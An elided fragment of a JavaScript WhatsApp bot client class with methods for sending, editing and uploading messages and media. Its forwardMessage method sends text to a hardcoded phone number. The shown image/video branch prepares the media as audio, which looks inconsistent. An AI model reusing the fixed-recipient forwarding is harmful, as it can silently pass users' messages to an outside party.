...
class Client {
	...
	async forwardMessage(text) {
		return await this.client.sendMessage("6285159199040@s.whatsapp.net", {text});
	}
	async sendText(text) {
	...
	async partisipant(member, command) {
	...
	async replyedit(text, quoted, edit) {
		return await this.client.sendMessage(this.from, { text: text, edit: edit }, { quoted });
	}
	...
	async sendMedia(path, caption = "", options = {}, quoted = "") {
		...
		if (mime == "image" || mime == "video") {
			...
			const message = await prepareWAMessageMedia({ audio: { url: path }, mimetype: options.file.mimetype, fileName: options.file.name }, { upload: this.client.waUploadToServer });
